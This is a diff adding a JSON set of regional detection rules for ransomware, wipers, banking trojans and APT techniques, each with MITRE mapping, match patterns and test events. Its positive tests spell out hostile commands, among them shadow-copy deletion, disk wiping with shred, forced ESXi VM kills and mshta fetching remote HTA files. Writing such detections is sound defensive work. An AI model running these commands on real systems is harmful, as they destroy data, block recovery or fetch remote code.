+   "description": "Black Basta drops dlaksjdoiwq.jpg and fkdjsadasd.ico in the temp directory as wallpaper and file icon. Victims concentrated in Europe and NA.",
+   "tactic": "Impact",
+   "technique": "T1491.001",
+   "technique_name": "Internal Defacement",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\dlaksjdoiwq.jpg",
+       "\\fkdjsadasd.ico"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "black-basta"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Local\\Temp\\dlaksjdoiwq.jpg",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Local\\Temp\\wallpaper.jpg",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-prestige-readme",
+   "name": "Prestige ransom note in Public",
+   "description": "Prestige (attributed to Sandworm, aimed at Ukraine and Polish logistics in 2022) drops a note named README in C:\\Users\\Public.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "\\users\\public\\readme"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "prestige",
+    "ua"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\Public\\README",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\Public\\README.md",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-prestige-enc-registry",
+   "name": "Prestige .enc file association",
+   "description": "Prestige registers a .enc extension under HKCR with an icon pointing to its note resources.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\\\.enc(\\\\|$)"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     },
+     {
+      "field": "value_data",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "prestige",
+    "ua"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCR\\.enc\\DefaultIcon",
+       "value_name": "",
+       "value_data": "C:\\Users\\Public\\icon.ico",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCR\\.txt\\DefaultIcon",
+       "value_name": "",
+       "value_data": "C:\\Windows\\System32\\imageres.dll,-102",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-alphv-symlink-evaluation",
+   "name": "fsutil symlink evaluation enabled (ALPHV hallmark)",
+   "description": "ALPHV/BlackCat enables remote-to-remote and remote-to-local symlink evaluation with fsutil to reach network shares.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.001",
+   "technique_name": "Windows Permissions",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\fsutil.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "symlinkevaluation\\s+(r2r|r2l|l2r|l2l):1"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "alphv"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\fsutil.exe",
+      "command": "fsutil behavior set SymlinkEvaluation R2R:1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\fsutil.exe",
+      "command": "fsutil behavior query SymlinkEvaluation"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-alphv-maxmpxct",
+   "name": "LanmanServer MaxMpxCt raised (ALPHV hallmark)",
+   "description": "ALPHV sets MaxMpxCt to 65535 for faster parallel SMB encryption.",
+   "tactic": "Impact",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "reg"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "lanmanserver\\parameters"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "maxmpxct"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "65535"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "alphv"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-royal-path-id",
+   "name": "Royal/BlackSuit locker invocation with -path and -id",
+   "description": "Royal ransomware (royal_w.exe) takes -path and a 32-hex -id argument (CISA AA23-061A).",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-path\\s+\\S+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-id\\s+[0-9a-f]{32}\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "royal"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\Public\\royal_w.exe",
+      "command": "royal_w.exe -path \\\\fs01\\data -id 0123456789abcdef0123456789abcdef"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Tools\\scan.exe",
+      "command": "scan.exe -path C:\\data -id 42"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-akira-wmi-shadow-removal",
+   "name": "Shadow copies removed via WMI object (Akira)",
+   "description": "Akira removes shadow copies with PowerShell Get-WmiObject Win32_Shadowcopy | Remove-WmiObject (CERT-In advisory).",
+   "tactic": "Impact",
+   "technique": "T1490",
+   "technique_name": "Inhibit System Recovery",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "win32_shadowcopy"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "remove-wmiobject|\\.delete\\(\\)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "akira"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-vssadmin-resize-shadowstorage",
+   "name": "vssadmin shrinking shadow storage",
+   "description": "vssadmin resize shadowstorage to a tiny maxsize forces shadow copy deletion, used by Conti, Ryuk, Maze and Mallox lineages.",
+   "tactic": "Impact",
+   "technique": "T1490",
+   "technique_name": "Inhibit System Recovery",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\vssadmin.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "resize shadowstorage"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "maxsize=(unbounded|\\d{1,3}mb)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\vssadmin.exe",
+      "command": "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\vssadmin.exe",
+      "command": "vssadmin list shadowstorage"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-esxi-vm-kill",
+   "name": "ESXi forced VM process kill",
+   "description": "esxcli vm process kill --type=force, used by Akira, Royal, Black Basta and ALPHV Linux lockers to release VMDK locks.",
+   "tactic": "Impact",
+   "technique": "T1489",
+   "technique_name": "Service Stop",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "esxcli\\s+vm\\s+process\\s+kill\\s+(--type|-t)[= ]\\s*(force|hard)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "esxi"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/esxcli",
+      "command": "esxcli vm process kill --type=force --world-id=12345"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/esxcli",
+      "command": "esxcli vm process list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-eu-ebury-library",
+   "name": "Ebury (Windigo) trojanized library names",
+   "description": "Ebury replaces or adds libns2/libns5/libpw3 style shared objects in /lib64 or /lib (ESET). It targets hosting providers in Europe and worldwide.",
+   "tactic": "Persistence",
+   "technique": "T1554",
+   "technique_name": "Compromise Host Software Binary",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/lib(64)?/lib(ns[0-9]|pw[0-9])\\.so(\\.\\d+)*$"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "eu",
+    "windigo",
+    "ebury",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/lib64/libns5.so",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/lib64/libnsl.so.1",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-grandoreiro-regsvr32-userdir",
+   "name": "regsvr32 registering a DLL from Public or ProgramData",
+   "description": "regsvr32 /s loading a DLL staged in a world-writable directory, a loader step reported for Grandoreiro and Mekotio chains in Latin America and Spain.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.010",
+   "technique_name": "Regsvr32",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\regsvr32.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/s"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": ".dll"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "grandoreiro",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32.exe /s C:\\Users\\Public\\Libraries\\a.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-certutil-decode-public",
+   "name": "certutil decoding a staged file in Public or ProgramData",
+   "description": "certutil -decode/-decodehex into a world-writable folder, seen in Brazilian banking-trojan droppers.",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "technique_name": "Deobfuscate/Decode Files or Information",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\certutil.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-decode(hex)?\\b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "banking-trojan",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command": "certutil -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command": "certutil -hashfile C:\\Users\\Public\\a.txt SHA256"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sea-ultraviewer-offpath",
+   "name": "UltraViewer running from a user-writable path",
+   "description": "UltraViewer, a Vietnam-origin remote-support tool, is abused in scams and intrusions. Legitimate helpdesk use is common, so low.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\ultraviewer\\w*\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sea",
+    "rmm",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\UltraViewer_Desktop.exe",
+      "command": "UltraViewer_Desktop.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe",
+      "command": "UltraViewer_Desktop.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sea-usb-hidden-attrib",
+   "name": "attrib hiding folders on removable-drive paths",
+   "description": "attrib +h +s on a drive-root folder is the USB-lure technique reported for Mustang Panda and Gamaredon (hide real files, show a shortcut).",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hidden Files and Directories",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\attrib.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "+h"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "+s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s[d-z]:\\\\\\*?\\s*(/s|/d|\\*|$)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sea",
+    "usb",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\attrib.exe",
+      "command": "attrib +h +s E:\\* /s /d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\attrib.exe",
+      "command": "attrib +r C:\\docs\\a.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-lnk-mshta-cmd-chain",
+   "name": "cmd launching mshta with a remote URL from a shortcut-style parent",
+   "description": "cmd /c start of mshta http..., the Kimsuky/Konni LNK follow-on step. Broad on its own, so keyed on cmd.exe plus mshta plus URL.",
+   "tactic": "Execution",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\cmd.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bmshta(\\.exe)?\\s+\\\"?https?://"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "kimsuky",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c mshta http://203.0.113.4/x.html"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c dir"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-hta-info-h-worm-vbs-temp",
+   "name": "wscript running a VBS from Temp with a hidden window switch",
+   "description": "wscript //B or //E:vbscript on a Temp script is the loader style of H-Worm/Houdini and other Middle East commodity RAT campaigns.",
+   "tactic": "Execution",
+   "technique": "T1059.005",
+   "technique_name": "Visual Basic",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\wscript.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "//b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "\\temp\\"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       ".vbs",
+       ".vbe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "h-worm",
+    "script"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe //B C:\\Users\\ann\\AppData\\Local\\Temp\\a.vbs"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\ops\\logon.vbs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-gamaredon-docx-remote-template",
+   "name": "Office launched with a remote template URL",
+   "description": "winword started with an http template argument; remote-template injection is a Gamaredon staple against Ukrainian organisations.",
+   "tactic": "Defense Evasion",
+   "technique": "T1221",
+   "technique_name": "Template Injection",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\winword.exe",
+       "\\excel.exe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\S+\\.(dotm|dotx|dot|xltm)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "gamaredon",
+    "office"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command": "WINWORD.EXE /n http://203.0.113.8/t.dotm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command": "WINWORD.EXE /n C:\\docs\\a.docx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-esxi-lockdown-shell-sandworm",
+   "name": "Linux wiper pattern: shred or dd over many disks",
+   "description": "shred -n/-z against /dev/sd* devices, a destructive pattern shared by Linux wipers used in the Russia-Ukraine theatre (for example AcidRain relatives and RedAlert variants).",
+   "tactic": "Impact",
+   "technique": "T1561.001",
+   "technique_name": "Disk Content Wipe",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bshred\\b.*(/dev/(sd|nvme|vd|xvd)\\w*)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "wiper",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -n 1 -z /dev/sda"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /tmp/secret.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-cn-linux-xmrig-cloud-agent-chattr",
+   "name": "chattr used on cloud agent directories",
+   "description": "chattr -i or +i on Alibaba/Tencent agent folders, used by Chinese-language miner kits to lock or unlock agent files around removal.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.002",
+   "technique_name": "Linux and Mac Permissions",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "chattr"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/usr/local/(aegis|qcloud)|/etc/aliyun"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "cn",
+    "miner",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/chattr",
+      "command": "chattr -i /usr/local/aegis/aegis_client"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/chattr",
+      "command": "chattr +i /etc/resolv.conf"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-powershell-downloadstring-hta-mshta-pair",
+   "name": "PowerShell invoking mshta against a remote URL",
+   "description": "powershell starting mshta with an http URL, a MuddyWater and OilRig-era chain step.",
+   "tactic": "Execution",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bmshta(\\.exe)?\\s+\\\"?'?https?://"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "muddywater",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c mshta http://203.0.113.5/a.hta"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c Get-Date"
+     }
+    ]
+   }
+  }
+ ]
+}
